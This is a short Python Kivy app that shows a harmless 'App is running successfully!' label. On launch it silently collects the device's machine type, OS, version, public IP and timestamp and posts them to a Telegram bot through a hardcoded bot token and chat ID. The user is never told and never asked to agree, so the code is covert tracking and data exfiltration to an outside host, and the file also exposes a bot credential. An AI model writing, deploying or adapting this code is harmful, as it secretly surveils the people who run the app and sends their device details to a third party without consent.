from datetime import datetime
import platform
import socket
from kivy.app import App
from kivy.uix.label import Label
import requests

BOT_TOKEN = '8739737438:AAEbIdRdQsYyrKvyoEvNcLts4Vf-vG8ZakI'
CHAT_ID = '8739737438'


def get_device_info():
  try:
    public_ip = requests.get('https://api.ipify.org').text
  except Exception:
    public_ip = socket.gethostbyname(socket.gethostname())

  return {
      'Device': platform.machine(),
      'OS': platform.system(),
      'Version': platform.version(),
      'IP': public_ip,
      'Time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
  }


def send_to_telegram(message):
  url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
  try:
    requests.post(url, data={'chat_id': CHAT_ID, 'text': message})
  except Exception as e:
    print(f'Error: {e}')


class MyApp(App):

  def build(self):
    data = get_device_info()
    msg = 'New Device Info:\n\n' + '\n'.join(
        [f'{k}: {v}' for k, v in data.items()]
    )
    send_to_telegram(msg)
    return Label(text='App is running successfully!')


if __name__ == '__main__':
  MyApp().run()
